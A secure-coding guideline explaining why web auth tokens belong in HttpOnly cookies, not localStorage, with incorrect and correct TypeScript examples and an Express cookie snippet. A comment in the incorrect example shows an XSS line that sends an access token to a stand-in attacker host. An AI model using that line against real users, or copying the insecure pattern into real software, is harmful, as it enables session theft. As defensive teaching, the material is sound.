---
title: Store Auth Tokens in HttpOnly Cookies
impact: CRITICAL
impactDescription: Prevents token theft via XSS — localStorage is readable by any script on the page
tags: security, auth, tokens, cookies, xss, localStorage
---

## Store Auth Tokens in HttpOnly Cookies

Auth tokens stored in `localStorage` or `sessionStorage` are accessible to any JavaScript running on the page. A single XSS vulnerability — even from a compromised third-party script — can exfiltrate every stored token. HttpOnly cookies are never accessible to JavaScript and are sent automatically with requests.

**Incorrect (tokens in localStorage — accessible to any script):**

```typescript
// lib/auth.ts
async function login(credentials: { email: string; password: string }) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials),
  })
  const { accessToken, refreshToken } = await response.json()

  // Any XSS payload can steal these tokens:
  // fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'))
  localStorage.setItem('accessToken', accessToken)
  localStorage.setItem('refreshToken', refreshToken)
}

async function fetchWithAuth(url: string) {
  const token = localStorage.getItem('accessToken')
  return fetch(url, {
    headers: { Authorization: `Bearer ${token}` },
  })
}
```

**Correct (HttpOnly cookies — server sets, browser sends automatically):**

```typescript
// lib/auth.ts
async function login(credentials: { email: string; password: string }) {
  // Server responds with Set-Cookie header containing HttpOnly token.
  // The browser stores the cookie — JavaScript never sees the token value.
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // Required: send and receive cookies
    body: JSON.stringify(credentials),
  })

  if (!response.ok) {
    throw new Error('Login failed')
  }

  // Server returns user profile — never the token itself
  return response.json() as Promise<{ id: string; email: string; role: string }>
}

async function fetchWithAuth(url: string, options: RequestInit = {}) {
  // Browser automatically attaches HttpOnly cookie — no manual token handling
  return fetch(url, {
    ...options,
    credentials: 'include',
  })
}
```

```typescript
// Server-side reference (Express example):
// res.cookie('session', signedToken, {
//   httpOnly: true,    // Not accessible via document.cookie
//   secure: true,      // HTTPS only
//   sameSite: 'lax',   // CSRF protection
//   maxAge: 15 * 60 * 1000, // 15 minutes
//   path: '/',
// })
```

If your API requires Bearer tokens (e.g., a third-party API), use a Backend-for-Frontend (BFF) proxy: the SPA sends cookie-authenticated requests to your BFF, which attaches the Bearer token server-side. The token never reaches the browser.

Server-side validation is required. HttpOnly cookies protect the transport — the server must still verify the token on every request.
